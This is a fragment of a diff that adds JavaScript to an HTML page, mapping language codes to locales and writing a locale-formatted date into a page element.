+var locale = 'en-US'; // Default 
+if (lang == 'ca') {
+    locale = 'en-CA';
+} else if (lang == 'fr') {
+    locale = 'fr-FR';
+} else if (lang == 'it') {
+    locale = 'it-IT';
+} else if (lang == 'zh') {
+    locale = 'zh-TW';
+}else if (lang == 'se') {
+    locale = 'sv-SE';
+}else if (lang == 'fi') {
+    locale = 'fi-FI';
+}else if (lang == 'no') {
+    locale = 'nb-NO';
+}else if (lang == 'dk') {
+    locale = 'da-DK';
+} else if (lang == 'es') {
+    locale = 'es-ES'; 
+} else if (lang == 'pt') {
+    locale = 'pt-PT';
+} else if (lang == 'de') {
+    locale = 'de-DE';
+} else if (lang == 'nl') {
+    locale = 'nl-NL';
+} else if (lang == 'cs' || lang == 'cz') {
+    locale = 'cs-CZ';
+}else if (lang == 'pl') {
+    locale = 'pl-PL';
+} else if (lang == 'ko') {
+    locale = 'ko-KR';
+}
+
+// Set locale based on country parameter
+var expdate = date.toLocaleDateString(locale, options);
+document.getElementById("dt").innerHTML = expdate;	
+</script>
+</body>
+</html>
